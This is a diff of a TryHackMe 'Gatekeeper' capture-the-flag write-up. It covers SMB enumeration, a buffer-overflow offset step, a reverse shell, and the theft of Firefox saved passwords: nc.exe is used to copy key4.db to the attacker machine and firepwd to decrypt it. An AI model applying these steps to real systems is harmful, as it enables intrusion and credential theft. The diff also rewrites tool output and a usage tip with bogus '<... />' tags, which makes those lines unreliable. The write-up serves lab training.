@@ -44,10 +44,10 @@ SF-Port31337-TCP:V=7.92%I=7%D=3/1%Time=621DDD81%P=x86_64-pc-linux-gnu%r(Ge
 SF:tRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(
 SF:SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20V
 SF:ia:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@nm
-SF:>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:\
+SF:>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2 />\r!!!\nHello\x20Call-ID:\
 SF:x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forwa
 SF:rds:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:\
-SF:x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x2
+SF:x20<sip:nm@nm />\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x2
 SF:0\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTTP
 SF:Options,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")
 SF:%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\r
@@ -70,14 +70,14 @@ I can see the 135, 139 ports are open so let's try `smbclient`: `smbclient -L //
 
 ```bash
 smbclient -L //10.10.51.255
-Enter WORKGROUP\kali's password: 
+Enter WORKGROUP\kali's password:
 
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
-        Users           Disk      
+        Users           Disk
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.51.255 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
@@ -88,12 +88,12 @@ now try `nmblookup`: `nmblookup -A $TARGET_IP`
 ```bash
 nmblookup -A 10.10.51.255
 Looking up status of 10.10.51.255
-        GATEKEEPER      <00> -         B <ACTIVE> 
-        WORKGROUP       <00> - <GROUP> B <ACTIVE> 
-        GATEKEEPER      <20> -         B <ACTIVE> 
-        WORKGROUP       <1e> - <GROUP> B <ACTIVE> 
-        WORKGROUP       <1d> -         B <ACTIVE> 
-        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
+        GATEKEEPER      <00> -         B <ACTIVE />
+        WORKGROUP       <00> - <GROUP /> B <ACTIVE />
+        GATEKEEPER      <20> -         B <ACTIVE />
+        WORKGROUP       <1e> - <GROUP /> B <ACTIVE />
+        WORKGROUP       <1d> -         B <ACTIVE />
+        ..__MSBROWSE__. <01> - <GROUP /> B <ACTIVE />
 
         MAC Address = 02-FD-26-02-B7-53
 ```
@@ -111,27 +111,27 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 Host script results:
-| smb-enum-shares: 
+| smb-enum-shares:
 |   account_used: guest
-|   \\10.10.51.255\ADMIN$: 
+|   \\10.10.51.255\ADMIN$:
 |     Type: STYPE_DISKTREE_HIDDEN
 |     Comment: Remote Admin
-|     Anonymous access: <none>
-|     Current user access: <none>
-|   \\10.10.51.255\C$: 
+|     Anonymous access: <none />
+|     Current user access: <none />
+|   \\10.10.51.255\C$:
 |     Type: STYPE_DISKTREE_HIDDEN
 |     Comment: Default share
-|     Anonymous access: <none>
-|     Current user access: <none>
-|   \\10.10.51.255\IPC$: 
+|     Anonymous access: <none />
+|     Current user access: <none />
+|   \\10.10.51.255\IPC$:
 |     Type: STYPE_IPC_HIDDEN
 |     Comment: Remote IPC
 |     Anonymous access: READ
 |     Current user access: READ/WRITE
-|   \\10.10.51.255\Users: 
+|   \\10.10.51.255\Users:
 |     Type: STYPE_DISKTREE
-|     Comment: 
-|     Anonymous access: <none>
+|     Comment:
+|     Anonymous access: <none />
 |_    Current user access: READ
 
 Nmap done: 1 IP address (1 host up) scanned in 52.79 seconds
@@ -176,7 +176,7 @@ Let's use smbclient to connect, maybe browse the shares that have read access:
 ```bash
 ┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/GATEKEEPER]
 └─$ smbclient //10.10.51.255/Users -U anonymous -W WORKGROUP
-Enter WORKGROUP\anonymous's password: 
+Enter WORKGROUP\anonymous's password:
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                  DR        0  Fri May 15 13:57:08 2020
@@ -208,7 +208,7 @@ The scenario here is we have a target machine at THM, but now we have a copy of 
 
 :::tip
 
-Tip from noodles: do `offset.py` script with a big-ass number, use `pattern_create.rb -l <big number>` then `pattern_offset.rb -l <big number> -q <EIP>` gives you the offset.
+Tip from noodles: do `offset.py` script with a big-ass number, use `pattern_create.rb -l <big number />` then `pattern_offset.rb -l <big number /> -q <EIP />` gives you the offset.
 
 :::
 
@@ -257,7 +257,7 @@ except:
 Run it!
 
 ```bash
-./eip.py   
+./eip.py
 buffer= 150
 Crash Overwrite EIP: 42424242...
 Done!
@@ -402,7 +402,7 @@ Once you pop a shell on the THM box, you can find the flag under the natbat user
 ```text
 {**************}
 
-The buffer overflow in this room is credited to Justin Steven and his 
+The buffer overflow in this room is credited to Justin Steven and his
 "dostackbufferoverflowgood" program.  Thank you!
 ```
 
@@ -440,13 +440,13 @@ Get to thinking "Firefox logins", google how to find firefox profiles and possib
 In our reverse shell:
 
 ```bash
-dir logins.json /s /p                                                                                               
-dir logins.json /s /p                                                                                               
- Volume in drive C has no label.                                                                                    
- Volume Serial Number is 3ABE-D44B                                                                                  
-                                                                                                                    
- Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release                     
-                                                                                                                    
+dir logins.json /s /p
+dir logins.json /s /p
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+
 05/14/2020  09:43 PM               600 logins.json
 ```
 
@@ -458,7 +458,7 @@ type logins.json
 C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>
 ```
 
-At first I was told we just need a couple of files from, the `key4.db` and `logins.json` and I used nc.exe to upload `key4.db` file to kali box. 
+At first I was told we just need a couple of files from, the `key4.db` and `logins.json` and I used nc.exe to upload `key4.db` file to kali box.
 
 :::tip
 
@@ -496,31 +496,31 @@ Now on my local I have the THM box firefox profile files.
 I used this `git clone https://github.com/lclevy/firepwd.git` to decrypt the firefox profile (note: `Share/` is where I downloaded files from the THM box):
 
 ```bash
-python3 firepwd.py -d Share/                                                                                    
-globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'                                                             
- SEQUENCE {                                                                                                         
-   SEQUENCE {                                                                                                       
-     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2                                                             
-     SEQUENCE {                                                                                                     
-       SEQUENCE {                                                                                                   
-         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2                                                        
-         SEQUENCE {                                                                                                 
-           OCTETSTRING b'9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d'                          
-           INTEGER b'01'                                                                                            
-           INTEGER b'20'                                                                                            
-           SEQUENCE {                                                                                               
-             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256                                                     
-           }                                                                                                        
-         }                                                                                                          
-       }                
-       SEQUENCE {    
-         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC   
+python3 firepwd.py -d Share/
+globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
          OCTETSTRING b'b0da1db2992a21a74e7946f23021'
-       }  
-     }  
-   }             
-   OCTETSTRING b'a713739460522b20433f7d0b49bfabdb'                                                                  
- }                                                        
+       }
+     }
+   }
+   OCTETSTRING b'a713739460522b20433f7d0b49bfabdb'
+ }
 clearText b'70617373776f72642d636865636b0202'
 password check? True
  SEQUENCE {
